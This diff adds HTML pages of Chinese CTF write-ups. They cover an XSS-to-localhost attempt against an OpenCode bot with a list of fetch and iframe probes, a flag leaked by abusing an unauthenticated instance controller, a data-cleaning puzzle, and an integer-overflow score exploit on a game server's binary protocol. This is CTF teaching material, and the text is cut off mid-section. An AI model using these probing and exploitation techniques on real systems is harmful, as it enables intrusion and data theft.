+<li>后端存在文件读取接口 <code>GET /file/content?path=...</code>，见 <code>tmp/opencode-src/packages/opencode/src/server/routes/file.ts</code></li>
+</ul>
+<p>如果能够在 <strong>localhost/opencode 同源上下文</strong> 执行 JS，那么理论上就有机会用 OpenCode 自身的接口去读 <code>/flag</code>。</p>
+<hr>
+<h3 id="二-预期-web-解的尝试过程">二、预期 Web 解的尝试过程</h3>
+<p>我一开始确实是按“题目预期”的思路推进的。</p>
+<h4 id="1-找到可执行-js-的-pages-dev-载体">1. 找到可执行 JS 的 <code>pages.dev</code> 载体</h4>
+<p>我用已有的可控内容站点作为 carrier，把 XSS payload 投到：</p>
+<pre><code>https://data-service-data-webs-amor.pages.dev/07/</code></pre>
+<p>并通过 webhook 多次确认：</p>
+<ul>
+<li>bot 的确会访问载体页面</li>
+<li>XSS 的确能执行</li>
+<li>脚本能向外带回探针结果</li>
+</ul>
+<h4 id="2-试图从-pages-dev-读-127-0-0-1-4096">2. 试图从 <code>pages.dev</code> 读 <code>127.0.0.1:4096</code></h4>
+<p>围绕本地 OpenCode 服务，我测试过这些路径：</p>
+<ul>
+<li><code>fetch(&#x27;http://127.0.0.1:4096/...&#x27;)</code></li>
+<li><code>fetch(..., { mode: &#x27;no-cors&#x27; })</code></li>
+<li><code>sendBeacon</code></li>
+<li><code>EventSource</code></li>
+<li><code>WebSocket</code></li>
+<li><code>&lt;script src=http://127.0.0.1:4096/...&gt;</code></li>
+<li><code>&lt;link rel=stylesheet ...&gt;</code></li>
+<li><code>&lt;img src=...&gt;</code></li>
+<li><code>&lt;iframe src=...&gt;</code></li>
+<li><code>javascript:</code> 导航桥</li>
+<li><code>window.name</code> / <code>postMessage</code> / redirect 链桥接</li>
+</ul>
+<h4 id="3-为什么都没走通">3. 为什么都没走通</h4>
+<p>最终远端探针表现很稳定：</p>
+<ol>
+<li><code>&lt;iframe&gt;</code> 可以导航到 <code>http://127.0.0.1:4096/...</code></li>
+<li>但这是跨源页面，外层 <code>pages.dev</code> JS 读不到其 DOM</li>
+<li><code>fetch</code> 读响应被 CORS / PNA（Private Network Access）限制卡死</li>
+<li><code>&lt;script&gt;</code> / <code>&lt;img&gt;</code> / <code>&lt;link&gt;</code> 等子资源从 <code>pages.dev</code> 指向 localhost 也没有形成可利用读取原语</li>
+</ol>
+<p>也就是说：</p>
+<ul>
+<li><strong>能让浏览器“访问” localhost</strong></li>
+<li>但<strong>拿不到 localhost 的响应内容</strong></li>
+</ul>
+<p>所以“业务预期解”的最后一步始终差一个同源 JS 执行点，无法把 <code>/file/content?path=/flag</code> 真正读出来。</p>
+<hr>
+<h3 id="三-真正的突破点-实例分发控制器信息泄露">三、真正的突破点：实例分发控制器信息泄露</h3>
+<p>在继续做题时，我注意到 GZCTF 给出的 <code>instanceEntry</code> 不直接是 bot 本身，而是一个公开的 controller。</p>
+<p>例如挑战详情会给出：</p>
+<pre><code>{
+  &quot;context&quot;: {
+    &quot;instanceEntry&quot;: &quot;114.66.24.221:34137&quot;
+  }
+}</code></pre>
+<p>这个地址返回的是一个 ECI controller 页面，而不是最终业务页面。</p>
+<h4 id="1-controller-暴露的接口">1. controller 暴露的接口</h4>
+<p>直接访问 controller 的根页面和前端脚本，可以看到它有这些公开接口：</p>
+<ul>
+<li><code>GET /api/status</code></li>
+<li><code>POST /api/instance/start</code></li>
+<li><code>POST /api/instance/destroy</code></li>
+<li><code>GET /healthz</code></li>
+</ul>
+<p>本地提取到的前端逻辑在 <code>tmp/controller43088_app.js</code> 中：</p>
+<pre><code>const response = await fetch(&quot;/api/status&quot;);
+const response = await fetch(&quot;/api/instance/start&quot;, { method: &quot;POST&quot; });
+const response = await fetch(&quot;/api/instance/destroy&quot;, { method: &quot;POST&quot; });</code></pre>
+<p>也就是说，这个 controller 是<strong>无鉴权公开可控</strong>的。</p>
+<h4 id="2-状态不一致带来的异常泄露">2. 状态不一致带来的异常泄露</h4>
+<p>题目分发时，GZCTF 平台侧也在维护 challenge 的 container 状态；controller 自己也维护一套实例状态。</p>
+<p>当我反复执行：</p>
+<ul>
+<li>GZCTF 侧删除 / 新建容器</li>
+<li>controller 侧 <code>start</code> / <code>destroy</code></li>
+<li>查询 <code>status</code></li>
+</ul>
+<p>时，出现过一次非常关键的“状态不同步”：</p>
+<ul>
+<li>GZCTF 认为实例已经存在</li>
+<li>controller 或其后端又尝试了不该发生的分发流程</li>
+<li>最终后端异常被直接返回到 HTTP 响应中</li>
+</ul>
+<p>而这个异常文本里，竟然带出了实际实例使用的 flag：</p>
+<pre><code>flag{45bf5920-d096-4e78-bb69-c9a14c9e7b17}</code></pre>
+<p>这就是最终提交通过的动态 flag。</p>
+<p>换句话说，这道题最后不是靠业务 XSS 打穿的，而是靠 <strong>动态环境 controller / 平台分发层的异常信息泄露</strong> 拿下的。</p>
+<hr>
+<h3 id="四-提交流程">四、提交流程</h3>
+<h4 id="1-确认提交是否需要加密">1. 确认提交是否需要加密</h4>
+<p>GZCTF 前端源码里，提交通常会先走 <code>encryptApiData(...)</code>：</p>
+<ul>
+<li><code>tmp/GZCTF-src/src/GZCTF/ClientApp/src/components/GameChallengeModal.tsx</code></li>
+<li><code>tmp/GZCTF-src/src/GZCTF/ClientApp/src/utils/Crypto.ts</code></li>
+</ul>
+<p>但平台配置接口 <code>/api/config</code> 返回：</p>
+<pre><code>{
+  &quot;apiPublicKey&quot;: null
+}</code></pre>
+<p>而 <code>encryptApiData</code> 的逻辑是：</p>
+<pre><code>if (!publicKey) {
+  return plainText
+}</code></pre>
+<p>因此这里 flag 可以<strong>明文提交</strong>。</p>
+<h4 id="2-实际提交">2. 实际提交</h4>
+<p>提交接口：</p>
+<pre><code>POST /api/game/2/challenges/46
+Content-Type: application/json
+{&quot;flag&quot;:&quot;flag{45bf5920-d096-4e78-bb69-c9a14c9e7b17}&quot;}</code></pre>
+<p>平台返回了一个提交 ID：</p>
+<pre><code>4549</code></pre>
+<p>随后轮询：</p>
+<pre><code>GET /api/game/2/challenges/46/status/4549</code></pre>
+<p>返回：</p>
+<pre><code>&quot;Accepted&quot;</code></pre>
+<p>说明动态 flag 正确。</p>
+<hr>
+<h3 id="五-完整利用思路总结">五、完整利用思路总结</h3>
+<h4 id="路线-a-题目预期方向">路线 A：题目预期方向</h4>
+<ol>
+<li>利用 <code>pages.dev</code> 载体触发 bot XSS</li>
+<li>试图访问 localhost 上的 OpenCode</li>
+<li>如果找到同源 JS 执行点，则调用 <code>/file/content?path=/flag</code></li>
+</ol>
+<p>这条路线在本题环境下被浏览器跨源策略卡住，没有最终产出。</p>
+<h4 id="路线-b-实际解法">路线 B：实际解法</h4>
+<ol>
+<li>从 GZCTF challenge 信息里拿到 <code>instanceEntry</code></li>
+<li>直接访问 ECI controller</li>
+<li>反复做 <code>status</code> / <code>start</code> / <code>destroy</code> 和平台侧重建</li>
+<li>在某次 controller 后端异常响应里抓到 <code>flag{...}</code></li>
+<li>直接提交 flag</li>
+</ol>
+<p>真正成功的是路线 B。</p>
+<hr>
+<h3 id="六-漏洞本质">六、漏洞本质</h3>
+<p>这次拿 flag 的根因并不在 OpenShell 业务本体，而在平台外围：</p>
+<ol>
+<li><strong>controller 接口公开暴露，无鉴权</strong></li>
+<li><strong>实例状态在平台侧和 controller 侧存在不一致窗口</strong></li>
+<li><strong>异常信息未做脱敏，直接把敏感内容回显给了客户端</strong></li>
+<li><strong>敏感信息中包含动态实例 flag</strong></li>
+</ol>
+<p>对于动态题平台来说，这类问题非常危险，因为它会绕过题目本身的设计边界，直接把平台注入的 flag 泄露出来。</p>
+<hr>
+<h3 id="七-复现建议">七、复现建议</h3>
+<p>如果以后需要重新复现这个漏洞，建议按下面顺序：</p>
+<ol>
+<li>先获取 challenge 当前的 <code>instanceEntry</code></li>
+<li>直接枚举 controller：</li>
+<p>- <code>GET /</code> - <code>GET /api/status</code> - <code>POST /api/instance/start</code> - <code>POST /api/instance/destroy</code></p>
+<li>再和 GZCTF 的容器创建 / 删除接口交替操作</li>
+<li>持续抓取所有响应正文，正则提取 <code>flag{...}</code></li>
+</ol>
+<p>一旦异常响应被打出来，通常就能直接命中真实动态 flag。</p>
+<hr>
+<h3 id="八-附-最终-flag">八、附：最终 flag</h3>
+<pre><code>flag{45bf5920-d096-4e78-bb69-c9a14c9e7b17}</code></pre>
+        </section>
+
+        <section class="wp-section">
+          <h2 id="what-another-mess-wp">What another mess! WP</h2>
+<h2 id="what-another-mess-wp-2">What another mess! WP</h2>
+<h3 id="题目信息-3">题目信息</h3>
+<ul>
+<li>题目类型：Misc</li>
+<li>服务端口：<code>114.66.24.221:43738</code></li>
+<li>最终 Flag：<code>flag{21e4d517-bdfb-46a2-9009-a5be64ca861e}</code></li>
+</ul>
+<h3 id="题目入口分析">题目入口分析</h3>
+<p>访问首页后可以看到这是一个“内部审计数据校验系统”，页面上给了两个下载链接：</p>
+<ul>
+<li><code>/download/customer_dump.csv</code></li>
+<li><code>/download/system_audit_logs.xlsx</code></li>
+</ul>
+<p>页面总共有 5 个问题，需要逐个提交答案。前端逻辑很直白，点击“验证”后会向 <code>/submit</code> 发送：</p>
+<pre><code>{&quot;index&quot;: 题号, &quot;answer&quot;: &quot;答案&quot;}</code></pre>
+<p>全部答对之后返回 flag。</p>
+<p>题面中的 5 个问题如下：</p>
+<ol>
+<li>经过清洗去重后，剩余多少个符合白名单号段的有效手机号？</li>
+<li>数据集中共有多少个身份证校验位（第18位）计算正确的记录？</li>
+<li>同时满足 Q1 和 Q2 的记录有多少条？</li>
+<li>针对上述 Q3 的用户，统计其账户余额的总和（忽略负数，保留两位小数）。</li>
+<li>在 Q3 的用户中，姓名为“李”姓（含汉字“李”和拼音“Li/li”）的人数是多少？</li>
+</ol>
+<h3 id="附件内容">附件内容</h3>
+<h4 id="1-system-audit-logs-xlsx">1. <code>system_audit_logs.xlsx</code></h4>
+<p>这个表非常关键，里面给了规则：</p>
+<ul>
+<li><code>Allow_Prefix = 135,136,137,138,139,150,151,152,158,159,186,188</code></li>
+<li><code>Min_Balance_Threshold = 0</code></li>
+<li><code>ID_Standard = GB 11643-1999</code></li>
+</ul>
+<p>由此可以确定：</p>
+<ul>
+<li>手机号是否有效，只看清洗后的号段是否在白名单中</li>
+<li>余额统计时负数要忽略</li>
+<li>身份证校验按中国居民身份证校验位规则来做</li>
+</ul>
+<h4 id="2-customer-dump-csv">2. <code>customer_dump.csv</code></h4>
+<p>表头如下：</p>
+<pre><code>Name, ID_Card, Phone, Balance</code></pre>
+<p>数据量很大，原始共有 <code>52500</code> 行。</p>
+<h3 id="初步观察">初步观察</h3>
+<p>随便看几行就能发现这是典型的数据清洗题，脏数据很多：</p>
+<ul>
+<li>全角字符：<code>＋８６１５９９１６９０７８９</code></li>
+<li>零宽字符：<code>\u200b</code>、<code>\u200c</code>、<code>\u200d</code>、<code>\ufeff</code></li>
+<li>手机号中混有空格、括号、连字符</li>
+<li>身份证中混入零宽字符</li>
+<li>余额中混有 <code>¥</code>、<code>CNY</code>、逗号</li>
+<li>数据中存在重复记录</li>
+</ul>
+<p>例如：</p>
+<pre><code>Phone: ＋８６１５９９１６９０７８９
+Phone: 139 2﻿536 6589
+Phone: 151(5243​)7890
+ID_Card: 13018119​4801090407
+Balance: ¥437,270
+Balance: -1,480CNY</code></pre>
+<h3 id="清洗思路">清洗思路</h3>
+<h4 id="1-统一文本标准化">1. 统一文本标准化</h4>
+<p>先对所有字段做统一文本标准化：</p>
+<ul>
+<li>使用 <code>unicodedata.normalize(&#x27;NFKC&#x27;, s)</code> 把全角转半角</li>
+<li>删除常见脏字符：</li>
+<p>- <code>\u200b</code> - <code>\u200c</code> - <code>\u200d</code> - <code>\ufeff</code> - <code>\u2060</code> - <code>\xa0</code> - <code>\u3000</code></p>
+<li>再做 <code>strip()</code></li>
+</ul>
+<h4 id="2-手机号清洗规则">2. 手机号清洗规则</h4>
+<p>手机号字段只保留数字：</p>
+<ul>
+<li>先做标准化</li>
+<li>用正则去掉非数字字符</li>
+<li>如果是 <code>+86</code> / <code>86</code> 风格前缀，清洗后会变成 13 位且以 <code>86</code> 开头，这种情况要去掉前导 <code>86</code></li>
+</ul>
+<p>例如：</p>
+<ul>
+<li><code>＋８６１５９９１６９０７８９</code> -&gt; <code>15991690789</code></li>
+<li><code>188-4546-8268</code> -&gt; <code>18845468268</code></li>
+<li><code>151(5243​)7890</code> -&gt; <code>15152437890</code></li>
+</ul>
+<p>有效手机号判定条件：</p>
+<ul>
+<li>清洗后长度为 <code>11</code></li>
+<li>前三位在白名单中：</li>
+</ul>
+<pre><code>135,136,137,138,139,150,151,152,158,159,186,188</code></pre>
+<h4 id="3-身份证清洗规则">3. 身份证清洗规则</h4>
+<p>身份证清洗：</p>
+<ul>
+<li>标准化</li>
+<li>转大写</li>
+<li>只保留 <code>[0-9X]</code></li>
+</ul>
+<p>校验规则使用 <code>GB 11643-1999</code> 的第 18 位校验位算法：</p>
+<p>前 17 位权重：</p>
+<pre><code>[7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]</code></pre>
+<p>映射表：</p>
+<pre><code>&quot;10X98765432&quot;</code></pre>
+<p>如果：</p>
+<ul>
+<li>长度不是 18，直接无效</li>
+<li>前 17 位不是数字，最后一位不是 <code>[0-9X]</code>，无效</li>
+<li>否则按校验位规则判断</li>
+</ul>
+<p>这里额外验证了一下生日位合法性，发现不会影响结果，所以只做校验位判断即可。</p>
+<h4 id="4-余额清洗规则">4. 余额清洗规则</h4>
+<p>余额字段处理方式：</p>
+<ul>
+<li>标准化</li>
+<li>删除 <code>¥</code></li>
+<li>删除 <code>CNY</code></li>
+<li>删除逗号</li>
+<li>保留负号和数字</li>
+</ul>
+<p>例如：</p>
+<ul>
+<li><code>¥437,270</code> -&gt; <code>437270</code></li>
+<li><code>171,117CNY</code> -&gt; <code>171117</code></li>
+<li><code>-1,480CNY</code> -&gt; <code>-1480</code></li>
+</ul>
+<p>最后用 <code>Decimal</code> 处理，避免浮点误差。</p>
+<h4 id="5-去重规则">5. 去重规则</h4>
+<p>题目明确说“经过清洗去重后”，所以要先清洗，再去重。</p>
+<p>去重键使用清洗后的整行四元组：</p>
+<pre><code>(Name, ID_Card, Phone, Balance)</code></pre>
+<p>统计后发现：</p>
+<ul>
+<li>原始记录数：<code>52500</code></li>
+<li>清洗后唯一记录数：<code>50000</code></li>
+</ul>
+<p>也就是说有 <code>2500</code> 条重复数据。</p>
+<h3 id="五个问题的计算">五个问题的计算</h3>
+<p>下面所有统计都基于“清洗后去重”的 <code>50000</code> 条记录。</p>
+<h4 id="q1">Q1</h4>
+<p>统计符合白名单号段的有效手机号数量。</p>
+<p>结果：</p>
+<pre><code>37994</code></pre>
+<h4 id="q2">Q2</h4>
+<p>统计身份证第 18 位校验正确的记录数量。</p>
+<p>结果：</p>
+<pre><code>35028</code></pre>
+<h4 id="q3">Q3</h4>
+<p>同时满足 Q1 和 Q2 的记录数量。</p>
+<p>结果：</p>
+<pre><code>26637</code></pre>
+<h4 id="q4">Q4</h4>
+<p>在 Q3 的用户中，统计余额总和，忽略负数，保留两位小数。</p>
+<p>结果：</p>
+<pre><code>6610675966.00</code></pre>
+<h4 id="q5">Q5</h4>
+<p>这是本题唯一容易翻车的地方。</p>
+<p>题目原文：</p>
+<blockquote>姓名为“李”姓（含汉字“李”和拼音“Li/li”）</blockquote>
+<p>一开始如果只统计以汉字 <code>李</code> 开头的人，会得到：</p>
+<pre><code>1718</code></pre>
+<p>但这是错的。</p>
+<p>继续检查数据会发现，Q3 里还存在这类名字：</p>
+<pre><code>Li林
+Li婷
+Li辉
+Li玉梅
+Li建军</code></pre>
+<p>也就是说题目里的“拼音 Li/li”并不是只指纯英文名，而是包括“姓氏用 Li，名字仍然是中文”的混合写法。</p>
+<p>因此 Q5 正确口径应为：</p>
+<ul>
+<li>以汉字 <code>李</code> 开头</li>
+<li>或者名字以 <code>Li</code> / <code>li</code> 开头</li>
+</ul>
+<p>这样统计结果为：</p>
+<pre><code>1924</code></pre>
+<h3 id="最终答案">最终答案</h3>
+<p>5 个问题的答案依次为：</p>
+<pre><code>Q1 = 37994
+Q2 = 35028
+Q3 = 26637
+Q4 = 6610675966.00
+Q5 = 1924</code></pre>
+<p>提交后得到：</p>
+<pre><code>flag{21e4d517-bdfb-46a2-9009-a5be64ca861e}</code></pre>
+<h3 id="复现脚本">复现脚本</h3>
+<p>下面是完整可复现脚本：</p>
+<pre><code>import csv
+import re
+import unicodedata
+from decimal import Decimal
+
+REMOVE = dict.fromkeys(map(ord, &quot;\u200b\u200c\u200d\ufeff\u2060\xa0\u3000&quot;), None)
+ALLOWED = {&quot;135&quot;,&quot;136&quot;,&quot;137&quot;,&quot;138&quot;,&quot;139&quot;,&quot;150&quot;,&quot;151&quot;,&quot;152&quot;,&quot;158&quot;,&quot;159&quot;,&quot;186&quot;,&quot;188&quot;}
+W = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
+V = &quot;10X98765432&quot;
+
+def norm_text(s):
+    s = &quot;&quot; if s is None else str(s)
+    s = unicodedata.normalize(&quot;NFKC&quot;, s)
+    s = s.translate(REMOVE)
+    return s.strip()
+
+def norm_phone(s):
+    digits = re.sub(r&quot;\D&quot;, &quot;&quot;, norm_text(s))
+    if len(digits) == 13 and digits.startswith(&quot;86&quot;):
+        digits = digits[2:]
+    return digits
+
+def valid_phone(p):
+    return len(p) == 11 and p[:3] in ALLOWED
+
+def norm_id(s):
+    return re.sub(r&quot;[^0-9X]&quot;, &quot;&quot;, norm_text(s).upper())
+
+def valid_id(i):
+    if len(i) != 18 or not re.fullmatch(r&quot;\d{17}[0-9X]&quot;, i):
+        return False
+    return V[sum(int(a) * b for a, b in zip(i[:17], W)) % 11] == i[-1]
+
+def norm_bal(s):
+    s = re.sub(r&quot;[^0-9.\-]&quot;, &quot;&quot;, norm_text(s).upper())
+    return Decimal(s)
+
+seen = set()
+rows = []
+
+with open(&quot;customer_dump.csv&quot;, &quot;r&quot;, encoding=&quot;utf-8-sig&quot;, newline=&quot;&quot;) as f:
+    for row in csv.DictReader(f):
+        item = (
+            norm_text(row[&quot;Name&quot;]),
+            norm_id(row[&quot;ID_Card&quot;]),
+            norm_phone(row[&quot;Phone&quot;]),
+            norm_bal(row[&quot;Balance&quot;]),
+        )
+        if item not in seen:
+            seen.add(item)
+            rows.append(item)
+
+q1 = 0
+q2 = 0
+q3 = 0
+q4 = Decimal(&quot;0&quot;)
+q5 = 0
+
+for name, idc, phone, bal in rows:
+    p = valid_phone(phone)
+    i = valid_id(idc)
+
+    if p:
+        q1 += 1
+    if i:
+        q2 += 1
+    if p and i:
+        q3 += 1
+        if bal &gt;= 0:
+            q4 += bal
+        if name.startswith(&quot;李&quot;) or name.lower().startswith(&quot;li&quot;):
+            q5 += 1
+
+print(&quot;Q1 =&quot;, q1)
+print(&quot;Q2 =&quot;, q2)
+print(&quot;Q3 =&quot;, q3)
+print(&quot;Q4 =&quot;, q4.quantize(Decimal(&quot;0.00&quot;)))
+print(&quot;Q5 =&quot;, q5)</code></pre>
+<p>运行结果：</p>
+<pre><code>Q1 = 37994
+Q2 = 35028
+Q3 = 26637
+Q4 = 6610675966.00
+Q5 = 1924</code></pre>
+<h3 id="总结">总结</h3>
+<p>这题本质上不是算法难题，而是一个典型的数据清洗题，重点在于：</p>
+<ol>
+<li>要先标准化再去重</li>
+<li>要处理全角字符和零宽字符</li>
+<li>手机号要把 <code>86</code> 国家码一起清掉</li>
+<li>身份证只要按标准校验位规则判断</li>
+<li>Q5 必须意识到 <code>Li林</code> 这种“拼音姓 + 中文名”也属于李姓</li>
+</ol>
+<p>最容易错的地方就是最后一问。如果只统计 <code>李*</code>，会少算 <code>206</code> 条，答案会从 <code>1924</code> 错成 <code>1718</code>。</p>
+        </section>
+
+        <section class="wp-section">
+          <h2 id="server-47768-wp">server 47768 WP</h2>
+<h2 id="server-47768-wp-2">server 47768 WP</h2>
+<h3 id="结论-2">结论</h3>
+<p>这题的目标不是正常刷分到榜一，而是利用评分更新里的有符号/无符号混用，把 <code>player.score</code> 写成超大正数，再用 <code>cmd=1</code> 领奖。</p>
+<p>新远端 <code>114.66.24.221:47768</code> 可复现拿到：</p>
+<pre><code>NCTF{d0692a31-053e-4f37-954f-607a4b149289}</code></pre>
+<h3 id="协议">协议</h3>
+<p>服务是自定义二进制协议：</p>
+<pre><code>request  = b&quot;GAME&quot; + be32(9 + len(payload)) + cmd(1 byte) + payload
+response = b&quot;GAME&quot; + be32(9 + len(payload)) + type(1 byte) + payload</code></pre>
+<p>命令如下：</p>
+<ul>
+<li><code>1</code>: 领奖</li>
+<li><code>2</code>: 查询当前分数/排名</li>
+<li><code>3</code>: 查询排行榜概览</li>
+<li><code>4</code>: reset</li>
+<li><code>5</code>: 随机匹配一个 <code>score &lt;= 50</code> 的对手</li>
+<li><code>6</code>: 查看棋盘</li>
+<li><code>7</code>: 落子，payload 形如 <code>b&quot;7,7&quot;</code></li>
+<li><code>8</code>: 认输；如果棋盘还空，则相当于 <code>Draw Delta=0</code>，可以无损重抽对手</li>
+</ul>
+<h3 id="关键逻辑">关键逻辑</h3>
+<p>领奖条件在 <code>cmd=1</code>：</p>
+<ul>
+<li>取排行榜第一名</li>
+<li>判断第一名名字是否等于当前玩家 <code>player</code></li>
+<li>相等则返回 <code>GZCTF_FLAG</code></li>
+</ul>
+<p>所以核心是把共享账号 <code>player</code> 送到榜一。</p>
+<h3 id="漏洞点">漏洞点</h3>
+<p>关键函数是 <code>score_apply_buggy_update</code>。</p>
+<p>正常更新函数会把负分钳到 <code>0</code>，但 buggy 版本有一条特殊分支：</p>
+<ul>
+<li>如果当前分数 <code>&lt;= 9</code> 且本次 <code>delta &lt; 0</code>，就直接返回当前分数，不再继续减</li>
+<li>否则直接返回 <code>current + delta</code></li>
+</ul>
+<p>真正的问题出在数据库写入：</p>
+<ul>
+<li><code>db_update_player_score</code> 调用 <code>sqlite3_bind_int64</code></li>
+<li>但传参时只写了 32 位寄存器</li>
+<li>当返回值是负的 32 位整数时，会被零扩展成超大的 64 位无符号值</li>
+</ul>
+<p>于是只要让当前分数处于 <code>&gt; 9</code>，再输一局使 <code>current + delta &lt; 0</code>，就会把分数写成类似 <code>4294967295</code> 的超大正数。</p>
+<h3 id="可达性">可达性</h3>
+<p>本题不是一眼就能直接输穿，需要先改变对手池分数。</p>
+<p>通过状态搜索可以找到一条可达链：</p>
+<pre><code>W 10  -&gt; 53
+L 20  -&gt; 37
+L 20  -&gt; 23
+L 30  -&gt; 15
+L 38  -&gt; 10
+L 7   -&gt; -1   -&gt; 写库后变成 4294967295</code></pre>
+<p>这里最后一步最关键：</p>
+<ul>
+<li>我方分数是 <code>10</code></li>
+<li>对手分数是 <code>7</code></li>
+<li>失败时 <code>delta = -11</code></li>
+<li><code>10 + (-11) = -1</code></li>
+</ul>
+<p>于是数据库里最终写入了：</p>
+<pre><code>4294967295</code></pre>
+<h3 id="关键细节">关键细节</h3>
+<h4 id="1-先赢一次-10-分-ai">1. 先赢一次 10 分 AI</h4>
+<p><code>cmd=5</code> 随机会匹配 <code>score &lt;= 50</code> 的对手，所以先不断重抽到 <code>10</code> 分对手。</p>
+<p>如果对手分数不对，直接 <code>cmd=8</code>：</p>
+<pre><code>Draw Delta=0</code></pre>
+<p>不会改分，可以继续抽。</p>
+<p>本地验证出的 <code>10</code> 分 AI 固定必赢手顺：</p>
+<pre><code>7,7
+8,7
+9,7
+10,7
+11,7</code></pre>
+<p>能直接形成横五，得到：</p>
+<pre><code>Win Delta=3 Score=53</code></pre>
+<h4 id="2-后面全是故意输棋">2. 后面全是故意输棋</h4>
+<p>每次匹配到目标分数对手后：</p>
+<ul>
+<li>先随便下一手，比如 <code>7,7</code></li>
+<li>再 <code>cmd=8</code> 认输</li>
+</ul>
+<p>这样能按预期更新双方分数，并把对手池逐步改造成最后需要的 <code>38</code> 和 <code>7</code>。</p>
+<h3 id="远端实测链">远端实测链</h3>
+<p>这条链在新远端上的实际结果是：</p>
+<pre><code>50 --Win 10--&gt; 53
+53 --Lose 20--&gt; 37
+37 --Lose 20--&gt; 23
+23 --Lose 30--&gt; 15
+15 --Lose 38--&gt; 10
+10 --Lose 7--&gt; 4294967295</code></pre>
+<p>最后状态：</p>
+<pre><code>OK Score=4294967295 Rank=1</code></pre>
+<p>随后 <code>cmd=1</code> 返回 flag。</p>
+<h3 id="利用脚本-2">利用脚本</h3>
+<p>同目录下的 <span><code>exploit_47768.py</code></span> <code>/mnt/e/Desktop/nctf/rev/exploit_47768.py</code> 会自动完成：</p>
+<ul>
+<li>reset</li>
+<li>无损重抽到目标对手</li>
+<li>赢 <code>10</code> 分 AI</li>
+<li>按分数序列依次认输</li>
+<li>最后领奖</li>
+</ul>
+<p>直接运行：</p>
+<pre><code>python3 /mnt/e/Desktop/nctf/rev/exploit_47768.py</code></pre>
+<h3 id="最终结果">最终结果</h3>
+<pre><code>NCTF{d0692a31-053e-4f37-954f-607a4b149289}</code></pre>
+        </section>
+
+        <section class="wp-section">
+          <h2 id="鸡爪流高手-wp">鸡爪流高手 WP</h2>
+<h2 id="鸡爪流高手-wp-2">鸡爪流高手 WP</h2>
+<h3 id="题目信息-4">题目信息</h3>
+<ul>
+<li>题目类型：RE</li>
+<li>题目附件：<code>server</code></li>
+<li>目标：让远端 <code>cmd=1</code> 返回 flag</li>
+</ul>
+<p>这题的关键不是正常刷分刷到榜一，而是利用计分逻辑中的整数处理问题，把 <code>player</code> 的分数打成一个超大的无符号值，直接升到 <code>Rank=1</code>，再调用 <code>cmd=1</code> 取 flag。</p>
+<p>我最终在远端 <code>114.66.24.221:46467</code> 上拿到：</p>
+<pre><code>NCTF{b6247961-9c56-4e99-b4bf-dc98fd931e07}</code></pre>
+<hr>
+<h3 id="1-协议分析">1. 协议分析</h3>
+<p>程序使用自定义二进制协议：</p>
+<pre><code>packet = b&quot;GAME&quot; + be32(9 + len(payload)) + cmd(1 byte) + payload</code></pre>
+<p>返回包格式相同。</p>
+<p>请求中的 <code>cmd</code> 已确认只有 <code>0..8</code> 这些分支。</p>
+<hr>
+<h3 id="2-各命令作用">2. 各命令作用</h3>
+<p>逆向和实测后可以得到：</p>
+<ul>
+<li><code>cmd=1</code>：领奖</li>
+<li><code>cmd=2</code>：查询当前分数和排名</li>
+<li><code>cmd=3</code>：查看排行榜概览</li>
+<li><code>cmd=4</code>：重置题目状态</li>
+<li><code>cmd=5</code>：随机匹配一个 <code>score &lt;= 50</code> 的对手</li>
+<li><code>cmd=6</code>：查看棋盘</li>
+<li><code>cmd=7</code>：下子，payload 形如 <code>b&quot;7,7&quot;</code></li>
+<li><code>cmd=8</code>：认输；如果棋盘还是空的，则按和棋结算</li>
+</ul>
+<p>其中有一个非常重要的细节：</p>
+<ul>
+<li>空棋盘直接 <code>cmd=8</code> 会返回 <code>Draw Delta=0</code></li>
+<li>也就是说可以无损重抽对手</li>
+</ul>
+<p>这使得我们可以不断匹配，直到抽到想要的分数目标。</p>
+<hr>
+<h3 id="3-cmd-1-的领奖条件">3. <code>cmd=1</code> 的领奖条件</h3>
+<p><code>cmd=1</code> 的逻辑非常直接：</p>
+<ol>
+<li>查询排行榜第一名</li>
+<li>判断第一名名字是否为当前玩家 <code>player</code></li>
+<li>如果是，就返回环境变量 <code>GZCTF_FLAG</code></li>
+<li>否则返回 <code>Permission denied</code></li>
+</ol>
+<p>所以本题最终目标就是：</p>
+<pre><code>让 player 变成排行榜第一</code></pre>
+<hr>
+<h3 id="4-reset-后的对手池">4. reset 后的对手池</h3>
+<p><code>cmd=4</code> 会把环境重置到一组固定状态。结合逆向和实测，可以观察到低分对手池基本是：</p>
+<pre><code>50, 40, 30, 20, 20, 10, 2000000</code></pre>
+<p>其中 <code>2000000</code> 那个显然不是拿来正常打的，真正可操作的是 <code>&lt;= 50</code> 的这些机器人。</p>
+<hr>
+<h3 id="5-稳定赢-10-分-ai">5. 稳定赢 10 分 AI</h3>
+<p>对 <code>10</code> 分 AI 已经验证出一条稳定必胜线路：</p>
+<pre><code>7,7 -&gt; 8,7 -&gt; 9,7 -&gt; 10,7 -&gt; 11,7</code></pre>
+<p>实测会形成横向五连，结算为：</p>
+<pre><code>Win Delta=3 Score=53 OppScore=7</code></pre>
+<p>这一点非常关键，因为它同时完成了两件事：</p>
+<ol>
+<li>把自己从 <code>50</code> 提高到 <code>53</code></li>
+<li>把原来的 <code>10</code> 分对手打成 <code>7</code> 分</li>
+</ol>
+<p>后面最后一步溢出，正是要输给这个 <code>7</code> 分对手。</p>
+<hr>
+<h3 id="6-关键漏洞-负分被写成超大正数">6. 关键漏洞：负分被写成超大正数</h3>
+<p>题目里有一个特殊计分函数 <code>score_apply_buggy_update</code>。它的意图是做“压分保护”：</p>
+<ul>
+<li>如果当前分数 <code>&lt;= 9</code></li>
+<li>并且这次 <code>delta &lt; 0</code></li>
+<li>那么直接返回当前分数，不再扣分</li>
+</ul>
+<p>可以理解成：</p>
+<pre><code>if (score &lt;= 9 &amp;&amp; delta &lt; 0)
+    return score;
+else
+    return score + delta;</code></pre>
+<p>真正的漏洞点在于：</p>
+<ul>
+<li>当当前分数 <code>&gt; 9</code> 时，程序仍然会执行 <code>score + delta</code></li>
+<li>如果这一步算出来是负数</li>
+<li>后续写库/显示时发生了有符号数和无符号数混用</li>
+<li>最终 <code>-1</code> 会变成 <code>4294967295</code></li>
+</ul>
+<p>也就是：</p>
+<pre><code>-1 -&gt; 0xffffffff -&gt; 4294967295</code></pre>
+<p>一旦出现这个结果，<code>player</code> 就会直接变成榜一。</p>
+<hr>
